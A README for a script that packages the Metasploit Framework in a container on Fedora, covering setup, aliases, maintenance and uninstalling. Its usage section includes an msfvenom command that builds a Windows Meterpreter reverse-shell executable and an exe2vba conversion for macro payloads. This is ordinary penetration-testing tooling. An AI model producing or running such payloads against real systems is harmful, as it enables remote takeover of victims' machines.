# Kali-based Metasploit Framework Toolbox

This project provides an automated setup to build a full [Metasploit Framework](https://www.kali.org) container environment on Fedora. It detaches the complex Metasploit dependencies from your host while providing 23 native-feeling aliases for all MSF utilities.

## Features
*   **Engine Agnostic**: Automatically detects and uses **Podman** (default on Fedora) or **Docker**.
*   **SELinux Aware**: Automatically applies the `:Z` flag to volume mounts to prevent permission errors on Fedora.
*   **Auto-LHOST**: The `msfconsole-bsd` command includes an interactive launcher that lets you select your host interface/IP to automatically set the global `LHOST` variable.
*   **Database Persistence**: Automatically initializes and starts the [PostgreSQL database](https://www.postgresql.org) for workspace and host management.
*   **Full Utility Suite**: Provides aliases for the entire MSF toolset, including `msfvenom`, `msfrpc`, and pattern creation tools.

## Installation
1. Save the setup script as `setup-msf.sh`.
2. Make it executable:
   ```bash
   chmod +x setup-msf.sh
3. Run the script:
   ```bash   
   ./setup-msf.sh
4. Reload your shell configuration:
   ```bash
   source ~/.bashrc
## Usage
### Interactive Console
Launch the main console. It will prompt you to select an interface IP for your listeners:
   ```bash
   msfconsole-bsd
   ```
### Payload Generation
Generate payloads directly into your current directory:
   ```bash
   msfvenom-bsd -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
   ```
### Exploit Development Utilities
Use the built-in helper tools for exploit research:
   ```bash
   msf-pattern_create-bsd -l 500
   msf-exe2vba-bsd payload.exe payload.vba
   ```
## Maintenance & Uninstallation
Each setup script (setup-msf.sh) now includes a built-in uninstaller to keep your host environment clean.
### Updating the Image
To update Metasploit to the latest version available in the Kali Rolling Repositories:
   ```bash
   bash setup-msf.sh
   ```
### Complete Uninstallation
To remove all 23 aliases from ~/.bashrc and delete the container image:
1. Uninstalling a Toolbox
To remove a specific toolbox, its associated container image, and its aliases from your ~/.bashrc, run the original setup script with the --uninstall flag:
  ```bash
  bash setup-msf.sh --uninstall
  ```
2. Finalising Removal
After running an uninstaller, you must reload your shell configuration to clear the aliases from your current session:
```bash
source ~/.bashrc
```
## Troubleshooting
- Database Connection: If db_status shows no connection, run msfdb-bsd init to reset the PostgreSQL environment.
- Firewall: Since the container uses --network host, ensure your Fedora Firewalld allows traffic on the ports you choose for LPORT.
- Permissions: The container mounts your current directory to /data. Files generated (like those from msfvenom) are accessible on your host immediately.

# License
Metasploit Framework: Licensed under the BSD 3-Clause License.
Setup Script: Licensed under the MIT License.

